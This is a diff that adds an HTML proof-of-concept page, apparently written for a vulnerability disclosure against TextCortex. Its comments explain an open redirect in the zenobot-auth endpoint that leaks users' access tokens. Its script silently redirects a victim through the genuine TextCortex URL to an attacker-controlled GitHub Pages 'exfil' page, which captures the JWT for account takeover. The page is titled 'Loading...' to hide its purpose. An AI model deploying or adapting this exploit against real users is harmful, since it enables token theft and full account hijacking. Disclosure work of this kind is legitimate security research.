@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<!-- TextCortex Single-Click ATO via zenoBotRedirect Open Redirect + Token Leak -->
+<!--
+  VULNERABILITY: /zenobot-auth?zenobot_source=ATTACKER_URL
+  The zenobot_source parameter accepts ANY URL with NO validation.
+  When an authenticated user visits this link, TextCortex appends their
+  access_token to the attacker URL and redirects them there.
+
+  Combined with CORS origin reflection on api.textcortex.com, the attacker
+  can then use the stolen token from any domain to access the victim's account.
+-->
+<script>
+  // Single-click: victim clicks a link to this page
+  // This redirects to TextCortex's zenobot-auth with attacker's collection URL
+  var ATTACKER_EXFIL = "https://dharani-dharan-11023.github.io/harpa-poc/exfil.html";
+  var ZENOBOT_URL = "https://app.textcortex.com/zenobot-auth?zenobot_source=" + encodeURIComponent(ATTACKER_EXFIL);
+
+  // Redirect victim to TextCortex - they see a legitimate textcortex.com URL
+  // TextCortex will then redirect them to ATTACKER_EXFIL with ?access_token=JWT
+  window.location = ZENOBOT_URL;
+</script>
+</body>
+</html>
